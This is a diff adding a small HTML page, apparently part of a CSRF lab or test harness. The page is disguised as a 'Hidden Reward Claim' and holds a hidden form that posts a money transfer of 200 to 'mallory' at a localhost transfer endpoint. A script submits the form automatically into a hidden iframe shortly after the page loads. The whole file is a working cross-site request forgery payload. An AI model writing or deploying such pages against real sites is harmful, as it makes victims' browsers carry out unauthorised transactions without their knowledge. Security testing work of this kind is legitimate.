@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Hidden Reward Claim</title>
+</head>
+<body>
+  <iframe name="hiddenRewardFrame" style="display:none;"></iframe>
+
+  <form
+    id="csrfForm"
+    action="http://localhost:3000/transfer"
+    method="POST"
+    target="hiddenRewardFrame"
+  >
+    <input type="hidden" name="to" value="mallory" />
+    <input type="hidden" name="amount" value="200" />
+    <input type="hidden" name="attackVector" value="external-csrf" />
+    <input type="hidden" name="attemptId" id="attemptIdField" value="" />
+  </form>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const attemptId = params.get("attemptId") || "";
+    document.getElementById("attemptIdField").value = attemptId;
+
+    setTimeout(function () {
+      document.getElementById("csrfForm").submit();
+    }, 300);
+  </script>
+</body>
+</html>
